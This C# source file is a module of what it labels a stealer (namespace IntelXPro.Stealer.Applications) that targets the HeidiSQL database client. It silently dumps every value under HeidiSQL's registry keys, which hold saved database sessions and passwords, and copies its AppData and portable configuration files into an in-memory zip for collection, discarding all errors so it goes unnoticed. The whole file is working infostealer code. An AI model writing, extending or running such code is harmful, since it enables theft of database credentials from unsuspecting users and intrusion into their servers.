using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class HeidiSQL : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "HeidiSQL";

            bool foundData = false;

            foundData |= CollectFromRegistry(zip, counterApplications);
            foundData |= CollectPortableConfig(zip, counterApplications);

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromRegistry(InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] registryPaths = new string[]
                {
                    "Software\\HeidiSQL",
                    "Software\\Wow6432Node\\HeidiSQL"
                };

                foreach (string regPath in registryPaths)
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath))
                    {
                        if (key != null)
                        {
                            StringBuilder configData = new StringBuilder();
                            configData.AppendLine($"Registry Path: HKEY_CURRENT_USER\\{regPath}");
                            configData.AppendLine();

                            string[] subKeyNames = key.GetSubKeyNames();
                            foreach (string subKeyName in subKeyNames)
                            {
                                using (RegistryKey subKey = key.OpenSubKey(subKeyName))
                                {
                                    if (subKey != null)
                                    {
                                        configData.AppendLine($"[{subKeyName}]");
                                        
                                        string[] valueNames = subKey.GetValueNames();
                                        foreach (string valueName in valueNames)
                                        {
                                            object value = subKey.GetValue(valueName);
                                            if (value != null)
                                            {
                                                configData.AppendLine($"{valueName} = {value}");
                                            }
                                        }
                                        configData.AppendLine();
                                    }
                                }
                            }

                            string[] mainValueNames = key.GetValueNames();
                            if (mainValueNames.Length > 0)
                            {
                                configData.AppendLine("[Main Settings]");
                                foreach (string valueName in mainValueNames)
                                {
                                    object value = key.GetValue(valueName);
                                    if (value != null)
                                    {
                                        configData.AppendLine($"{valueName} = {value}");
                                    }
                                }
                            }

                            if (configData.Length > 0)
                            {
                                string zipPath = "Applications\\HeidiSQL\\registry_config.txt";
                                zip.AddTextFile(zipPath, configData.ToString());
                                counterApplications.Files.Add($"Registry: {regPath} => {zipPath}");
                                foundData = true;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectPortableConfig(InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "HeidiSQL");
                
                if (Directory.Exists(appDataPath))
                {
                    string[] configFiles = Directory.GetFiles(appDataPath, "*.txt", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in configFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = "Applications\\HeidiSQL\\" + fileName;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string[] portablePaths = new string[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "HeidiSQL"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "HeidiSQL"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "HeidiSQL")
                };

                foreach (string portablePath in portablePaths)
                {
                    string portableFile = Path.Combine(portablePath, "portable.txt");
                    if (File.Exists(portableFile))
                    {
                        string zipPath = "Applications\\HeidiSQL\\portable.txt";
                        zip.AddFile(zipPath, File.ReadAllBytes(portableFile));
                        counterApplications.Files.Add(portableFile + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
